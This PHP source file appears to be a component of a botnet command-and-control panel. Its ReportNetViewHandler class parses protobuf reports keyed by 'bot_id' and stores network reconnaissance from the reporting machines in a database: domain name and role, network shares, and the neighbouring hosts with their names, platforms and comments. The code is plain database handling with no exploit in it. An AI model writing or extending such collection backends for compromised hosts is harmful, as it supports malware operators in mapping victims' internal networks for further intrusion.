<?php

require_once 'ReportHandler.php';
require_once 'application/modules/protobuf/pb_proto_protocol.php';

class ReportNetViewHandler extends ReportHandler
{
    public function grabDataFromProtobuf($input_data, $botid)
    {
        try {
            $reportNetView = new ReportNetView();
            $reportNetView->ParseFromString($input_data);
            $this->data = $reportNetView->getAssocArray();
            $this->data['bot_id'] = $this->getRowIdByBotId($botid);
        }
        catch (Exception $e) {
            Logger::Error('ReportNetViewHandler', 'grabDataFromProtobuf (exception)', $e, null, json_encode($this->data));
        }
    }

    public function storeDataToServer()
    {
        try
        {
            if ($this->dataIsEmpty())
            {
                Logger::Error('ReportNetViewHandler', 'dataIsEmpty', 'Empty required data', null, json_encode($this->data));
                return false;
            }


            $convertedData = array();

            $convertedData['bot_id'] = $this->data['bot_id'];

            $convertedData['domain_name'] = $this->data['domainInfo']['name'];
            $convertedData['domain_role'] = $this->data['domainInfo']['role'];

            if (!empty($this->data['extendedName'])) {
                $convertedData['extended_name'] = $this->data['extendedName'];
            }

            if (!empty($this->data['networkShares'])) {
                $convertedData['network_shares'] = $this->data['networkShares'];
            }

            $netViewInfoId = 0;

            $this->getDB()->beginTransaction();


            switch($this->getCurrStatusForNetViewRow($convertedData, $netViewInfoId))
            {
                case RowStatus::EXIST:
                    break;
                case RowStatus::NOT_EXIST:
                    $netViewInfoId = $this->getDB()->insert('reports_netview_info', $convertedData);
                    break;
                case RowStatus::NEED_TO_UPDATE:
                    $this->getDB()->update('reports_netview_info', $convertedData, 'id=:id', array(':id' => $netViewInfoId));
                    break;
            }

            if ($netViewInfoId < 1) {
                $this->getDB()->rollBack();
                Logger::Error('ReportNetViewHandler', 'storeDataToServer (save in bd)', 'Did not be save or update', null, json_encode($this->data));
                return false;
            }

            if (empty($this->data['netViewInfo'])) {
                $this->getDB()->commit();
                return true;
            }

            $currentClientInfoRows = $this->getDB()->queryRows('SELECT * FROM reports_netview_info_clients WHERE reports_netview_info_id=:reports_netview_info_id',
                array(':reports_netview_info_id' => $netViewInfoId));


            foreach($this->data['netViewInfo'] as $netViewClient)
            {
                $netViewInfoRowId = 0;
                $clientDataForInsert = array();

                $clientDataForInsert['reports_netview_info_id'] = $netViewInfoId;
                $clientDataForInsert['name'] = $netViewClient['name'];
                $clientDataForInsert['type'] = $netViewClient['type'];
                $clientDataForInsert['platform'] = $netViewClient['platform'];

                if (!empty($netViewClient['comment'])) {
                    $clientDataForInsert['comment'] = $netViewClient['comment'];
                }

                switch($this->getCurrStatusForClientRow($clientDataForInsert, $currentClientInfoRows, $netViewInfoRowId))
                {
                    case RowStatus::EXIST:
                        continue;
                        break;
                    case RowStatus::NOT_EXIST:
                        $this->getDB()->insert('reports_netview_info_clients', $clientDataForInsert);
                        break;
                    case RowStatus::NEED_TO_UPDATE:
                        $this->getDB()->update('reports_netview_info_clients', $clientDataForInsert, 'id=:id', array(':id' => $netViewInfoRowId));
                        break;
                }
            }

            $this->getDB()->commit();
        }
        catch (Exception $e)
        {
            $this->getDB()->rollBack();
            Logger::Error('ReportNetViewHandler', 'storeDataToServer (exception)', $e, null, json_encode($this->data));
            return false;
        }
        return true;
    }

    protected function dataIsEmpty()
    {
        if (empty($this->data['domainInfo']))
            return true;
        if (empty($this->data['domainInfo']['name']))
            return true;
        if (empty($this->data['domainInfo']['role']) && (int)$this->data['domainInfo']['role'] !== 0)
            return true;

        return false;
    }

    private function getRoleNameByIdentifier($roleId)
    {
        switch($roleId)
        {
            case 100:
                return 'name1';
            case 200:
                return 'name2';
            default:
                return 'none';
        }
    }

    private function getCurrStatusForNetViewRow($netViewInfo, &$netViewRowId)
    {
        $currentNetViewInfo = $this->getDB()->queryRow('SELECT * FROM reports_netview_info WHERE bot_id=:bot_id', array(':bot_id' => $netViewInfo['bot_id']));

        if ($currentNetViewInfo)
        {
            $netViewRowId = (int)$currentNetViewInfo['id'];

            if ($currentNetViewInfo['domain_name'] == $netViewInfo['domain_name'] &&
                $currentNetViewInfo['domain_role'] == $netViewInfo['domain_role'] &&
                $currentNetViewInfo['extended_name'] == $netViewInfo['extended_name'] &&
                $currentNetViewInfo['network_shares'] == $netViewInfo['network_shares'])
            {
                return RowStatus::EXIST;
            }
            return RowStatus::NEED_TO_UPDATE;
        }
        return RowStatus::NOT_EXIST;
    }

    private function getCurrStatusForClientRow($clientInfo, $currentClientInfoRows, &$clientInfoRowId)
    {
        foreach($currentClientInfoRows as $dbClientInfoRow)
        {
            if ($clientInfo['name'] == $dbClientInfoRow['name'] && $clientInfo['type'] == $dbClientInfoRow['type'] &&
                $clientInfo['platform'] == $dbClientInfoRow['platform'] && $clientInfo['comment'] == $dbClientInfoRow['comment'])
            {
                return RowStatus::EXIST;
            }

            if ($clientInfo['name'] == $dbClientInfoRow['name'] && $clientInfo['type'] == $dbClientInfoRow['type'] &&
                $clientInfo['platform'] == $dbClientInfoRow['platform'] && $clientInfo['comment'] != $dbClientInfoRow['comment'])
            {
                $clientInfoRowId = (int)$dbClientInfoRow['id'];
                return RowStatus::NEED_TO_UPDATE;
            }
        }
        return RowStatus::NOT_EXIST;
    }

}

abstract class RowStatus
{
    const EXIST = 1;
    const NOT_EXIST = 2;
    const NEED_TO_UPDATE = 3;
}